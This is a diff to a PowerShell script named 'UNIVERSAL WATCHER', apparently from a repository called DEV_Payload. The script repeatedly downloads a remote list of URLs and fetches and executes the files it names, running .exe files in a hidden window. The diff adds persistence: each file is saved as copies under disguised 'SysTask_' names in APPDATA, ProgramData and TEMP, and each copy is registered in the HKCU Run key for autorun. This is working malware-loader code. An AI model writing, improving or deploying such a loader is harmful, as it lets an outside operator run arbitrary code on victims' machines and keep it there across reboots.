@@ -1,5 +1,5 @@
 # ================================================
-# UNIVERSAL WATCHER - CSV Download & Executor with Loop
+# UNIVERSAL WATCHER - CSV Download, Multi-Copy, Autorun, Loop
 # ================================================
 
 Add-Type -AssemblyName PresentationFramework
@@ -7,15 +7,22 @@ Add-Type -AssemblyName PresentationFramework
 # CSV file URL
 $CsvUrl = "https://raw.githubusercontent.com/Umair13303/DEV_Payload/refs/heads/main/GitHub_Script/Excel/Installer_Path.csv?nocache=$([guid]::NewGuid())"
 
-# Download location
-$DownloadDir = [Environment]::GetFolderPath("ApplicationData")
+# Paths to save multiple hidden copies
+$BasePaths = @(
+    "$env:APPDATA",
+    "$env:ProgramData",
+    "$env:TEMP"
+)
+
+# Registry path for autorun entries
+$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 
 while ($true) {
     try {
         [System.Windows.MessageBox]::Show("Downloading installer list...", "Dynamic Watcher")
         Write-Host "Fetching $CsvUrl"
 
-        # Download CSV content
+        # Download and parse CSV
         $csvContent = Invoke-WebRequest -Uri $CsvUrl -UseBasicParsing
         $rows = $csvContent.Content | ConvertFrom-Csv
 
@@ -27,24 +34,46 @@ while ($true) {
 
             if ($status -eq "TRUE") {
                 $fileName = [System.IO.Path]::GetFileName($url)
-                $targetPath = Join-Path -Path $DownloadDir -ChildPath $fileName
+                $extension = [System.IO.Path]::GetExtension($fileName)
 
-                [System.Windows.MessageBox]::Show("Downloading: $url", "Dynamic Watcher")
-                Write-Host "Downloading $url to $targetPath"
+                foreach ($basePath in $BasePaths) {
+                    $guidName = "SysTask_" + [guid]::NewGuid().ToString() + $extension
+                    $targetPath = Join-Path $basePath $guidName
 
-                Invoke-WebRequest -Uri $url -OutFile $targetPath -UseBasicParsing
+                    try {
+                        # Download file to unique hidden path
+                        Invoke-WebRequest -Uri $url -OutFile $targetPath -UseBasicParsing
+                        Write-Host "Saved to $targetPath"
 
-                [System.Windows.MessageBox]::Show("Downloaded: $fileName`nExecuting...", "Dynamic Watcher")
+                        # Register autorun
+                        $regKeyName = "Watcher_" + ([guid]::NewGuid().ToString("N").Substring(0, 8))
+                        $runCmd = if ($extension -eq ".bat") {
+                            "`"$env:ComSpec`" /c `"$targetPath`""
+                        } elseif ($extension -eq ".exe") {
+                            "`"$targetPath`""
+                        } else {
+                            $null
+                        }
 
-                switch ($type.ToLower()) {
-                    ".bat" {
-                        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$targetPath`"" -WindowStyle Hidden
-                    }
-                    ".exe" {
-                        Start-Process -FilePath $targetPath -WindowStyle Hidden
-                    }
-                    default {
-                        [System.Windows.MessageBox]::Show("Unknown executor type: $type", "Dynamic Watcher")
+                        if ($runCmd) {
+                            New-ItemProperty -Path $RegPath -Name $regKeyName -Value $runCmd -PropertyType String -Force | Out-Null
+                            Write-Host "Registered autorun: $regKeyName"
+                        }
+
+                        # Execute the file
+                        switch ($extension.ToLower()) {
+                            ".bat" {
+                                Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$targetPath`""
+                            }
+                            ".exe" {
+                                Start-Process -FilePath $targetPath -WindowStyle Hidden
+                            }
+                            default {
+                                [System.Windows.MessageBox]::Show("Unknown executor type: $type", "Dynamic Watcher")
+                            }
+                        }
+                    } catch {
+                        Write-Host "Failed to process $url: $($_.Exception.Message)"
                     }
                 }
             }
@@ -53,6 +82,6 @@ while ($true) {
         [System.Windows.MessageBox]::Show("ERROR: $($_.Exception.Message)", "Dynamic Watcher")
     }
 
-    # Wait 10 seconds before next check
+    # Wait 10 seconds before next round
     Start-Sleep -Seconds 10
 }
